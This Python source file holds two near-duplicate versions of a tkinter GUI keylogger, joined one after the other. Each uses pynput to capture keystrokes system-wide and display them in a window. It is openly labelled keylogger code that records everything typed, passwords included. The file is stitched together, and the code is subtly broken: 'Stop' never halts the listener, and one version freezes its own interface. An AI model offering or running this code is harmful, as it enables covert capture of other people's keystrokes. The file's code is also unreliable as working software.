import tkinter as tk
from pynput import keyboard
import threading

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")

        self.textbox = tk.Text(self.root, wrap='word')
        self.textbox.pack(fill='both', expand=True)

        self.start_button = tk.Button(self.root, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack(pady=10)

        self.stop_button = tk.Button(self.root, text="Stop Keylogger", command=self.stop_keylogger)
        self.stop_button.pack(pady=5)

        self.is_keylogging = False
        self.logged_text = ""

    def on_key_press(self, key):
        try:
            keylogs = key.char
        except AttributeError:
            if key == keyboard.Key.enter:
                keylogs = '\n'
            else:
                keylogs = f"[{key}]"

        self.logged_text += keylogs
        self.textbox.delete(1.0, tk.END)
        self.textbox.insert(tk.END, self.logged_text)

    def on_key_release(self, key):
        if key == keyboard.Key.esc:
            self.stop_keylogger()

    def start_keylogger(self):
        if not self.is_keylogging:
            self.is_keylogging = True
            self.logged_text = ""
            self.textbox.delete(1.0, tk.END)
            threading.Thread(target=self.run_keylogger).start()

    def run_keylogger(self):
        with keyboard.Listener(on_press=self.on_key_press, on_release=self.on_key_release) as listener:
            listener.join()

    def stop_keylogger(self):
        self.is_keylogging = False


if __name__ == "__main__":
    root = tk.Tk()
    keylogger_gui = KeyloggerGUI(root)
    root.mainloop()
import tkinter as tk
from pynput import keyboard

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")

        self.textbox = tk.Text(self.root, wrap='word')
        self.textbox.pack(fill='both', expand=True)

        self.start_button = tk.Button(self.root, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack(pady=10)

        self.stop_button = tk.Button(self.root, text="Stop Keylogger", command=self.stop_keylogger)
        self.stop_button.pack(pady=5)

        self.is_keylogging = False
        self.logged_text = ""

    def on_key_press(self, key):
        try:
            keylogs = key.char
        except AttributeError:
            if key == keyboard.Key.enter:
                keylogs = '\n'
            else:
                keylogs = f"[{key}]"

        self.logged_text += keylogs
        self.textbox.delete(1.0, tk.END)
        self.textbox.insert(tk.END, self.logged_text)

    def on_key_release(self, key):
        if key == keyboard.Key.esc:
            self.stop_keylogger()

    def start_keylogger(self):
        if not self.is_keylogging:
            self.is_keylogging = True
            self.logged_text = ""
            self.textbox.delete(1.0, tk.END)
            with keyboard.Listener(on_press=self.on_key_press, on_release=self.on_key_release) as listener:
                listener.join()

    def stop_keylogger(self):
        self.is_keylogging = False


if __name__ == "__main__":
    root = tk.Tk()
    keylogger_gui = KeyloggerGUI(root)
    root.mainloop()
